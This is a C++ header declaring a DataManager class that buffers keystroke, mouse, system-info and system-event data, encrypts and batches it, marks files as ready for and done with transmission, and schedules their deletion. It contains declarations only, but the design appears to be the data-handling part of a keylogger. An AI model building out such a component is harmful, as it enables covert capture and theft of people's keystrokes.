#ifndef DATAMANAGER_H
#define DATAMANAGER_H

#include "data/KeyData.h"
#include "utils/SystemUtils.h"
#include "data/SystemData.h"
#include "core/Platform.h"
#include <string>
#include <vector>
#include <mutex>
#include <chrono>   
    
struct MouseData;
struct SystemEventData;

class Configuration;

class DataManager {
public:
    explicit DataManager(Configuration* config);
    ~DataManager();
    
    void AddKeyData(const KeyData& keyData);
    void AddMouseData(const MouseData& mouseData);
    void AddSystemData(const utils::SystemInfo& systemInfo);
    void AddSystemEventData(const SystemEventData& eventData);
    
    std::vector<uint8_t> RetrieveEncryptedData();
    void ClearData();
    bool HasData() const;
    
    // Batch collection methods
    void StartBatchCollection();
    bool IsBatchReady() const;
    std::vector<uint8_t> GetBatchData();
    
private:
    Configuration* m_config;
    std::string m_storagePath;  // Changed from std::wstring to std::string for cross-platform
    std::string m_currentDataFile;  // Changed from std::wstring to std::string
    size_t m_maxBufferSize;
    
    mutable std::mutex m_dataMutex;
    std::string m_keyDataBuffer;
    std::string m_mouseDataBuffer;
    std::string m_systemDataBuffer;
    std::string m_systemEventBuffer;
    
    // Batch collection members
    std::chrono::steady_clock::time_point m_batchStartTime;
    std::vector<uint8_t> m_batchData;
    
    void InitializeStorage();
    void FlushAllData();
    void FlushKeyData();
    void FlushMouseData();
    void FlushSystemData();
    void FlushSystemEvents();
    void AppendToFile(const std::string& path, const std::string& data);  // Changed parameter type
    void RotateDataFileIfNeeded();
    void RotateDataFile();
    
    static std::vector<std::string> GetDataFilesReadyForTransmission() ;  // Changed return type
    static void MarkFileAsTransmitted(const std::string& filePath);  // Changed parameter type
    static void ScheduleFileDeletion(const std::string& filePath, uint64_t delayMs);  // Changed parameter type
    
    static std::string KeyDataToString(const KeyData& data) ;
    static std::string MouseDataToString(const MouseData& data) ;
    static std::string SystemInfoToString(const SystemInfo& info) ;
    std::string SystemEventToString(const SystemEventData& event) const;
    std::string GenerateBatchId() const;
};

#endif